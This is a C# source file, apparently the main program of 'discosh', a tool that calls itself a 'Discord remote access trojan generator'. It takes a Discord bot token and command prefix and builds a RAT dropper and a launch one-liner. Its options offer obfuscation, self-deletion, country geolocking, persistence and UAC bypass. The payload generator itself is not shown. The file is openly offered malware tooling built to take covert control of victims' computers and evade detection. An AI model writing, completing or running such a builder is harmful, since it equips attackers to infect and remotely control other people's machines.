using System;
using System.IO;

namespace discosh
{
    internal class Program
    {
        private static string _output = string.Empty;
        private static string _token = string.Empty;
        private static string _prefix = string.Empty;
        private static string _geolock = string.Empty;
        private static bool _obf = false;
        private static bool _delself = false;
        private static bool _ponly = false;

        static void Main(string[] args)
        {
            if (args.Length < 1) HelpManual();
            else if (args[0] == "help" || args[0] == "--help" || args[0] == "-h") HelpManual();

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-o" || args[i] == "--output") _output = args[i + 1];
                else if (args[i] == "-t" || args[i] == "--token") _token = args[i + 1];
                else if (args[i] == "-p" || args[i] == "--prefix") _prefix = args[i + 1];
                else if (args[i] == "-obf" || args[i] == "--obfuscate") _obf = true;
                else if (args[i] == "-d" || args[i] == "--deleteself") _delself = true;
                else if (args[i] == "-gl" || args[i] == "--geolock") _geolock = args[i + 1];
                else if (args[i] == "-po" || args[i] == "--payload") _ponly = true;
            }

            if (_output == string.Empty)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Insufficient arguments: No output path specified.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (_token == string.Empty)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Insufficient arguments: No Discord bot token specified.");
                Console.ResetColor();
                Environment.Exit(1);
            }
            if (_prefix == string.Empty)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Insufficient arguments: No Discord bot command prefix specified.");
                Console.ResetColor();
                Environment.Exit(1);
            }

            byte[] result = PGen.Generate(_token, _prefix, _obf, _delself, _geolock, _ponly);
            Console.WriteLine($"Writing output to: {_output}");
            File.WriteAllBytes(_output, result);
            Console.WriteLine($"\nCommand line one-liner: {PGen.GenerateCommand(_token, _prefix, _geolock, _ponly)}\n");

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Done.");
            Console.ResetColor();
            Environment.Exit(0);
        }

        static void HelpManual()
        {
            ConsoleColor oldc = Console.ForegroundColor;
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(@"
██████╗ ██╗███████╗ ██████╗ ██████╗    ███████╗██╗  ██╗
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗   ██╔════╝██║  ██║
██║  ██║██║███████╗██║     ██║   ██║   ███████╗███████║
██║  ██║██║╚════██║██║     ██║   ██║   ╚════██║██╔══██║
██████╔╝██║███████║╚██████╗╚██████╔╝██╗███████║██║  ██║
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("-- Discord remote access trojan generator --\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Usage:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" discosh [-h|--help] [-o|--output] [-t|--token] [-p|--prefix] [-obf|--obfuscate] [-d|--deleteself] [-gl|--geolock] [-po|payloadonly]\n\n");

            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Arguments:");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("--help          Print help information");
            Console.WriteLine("--output        Set file output path");
            Console.WriteLine("--token         Set Discord bot token");
            Console.WriteLine("--prefix        Set Discord bot command prefix");
            Console.WriteLine("--obfuscate     Obfuscate dropper");
            Console.WriteLine("--deleteself    Make dropper delete itself");
            Console.WriteLine("--geolock       Make RAT only infect machines in specified countries. To specify multiple countries, seperate each country name with a comma (no spaces)");
            Console.WriteLine("--payloadonly   Generate RAT payload only without stager (no persistence and no UAC bypass)");
            Console.WriteLine();
            Console.ForegroundColor = oldc;
            Environment.Exit(0);
        }
    }
}
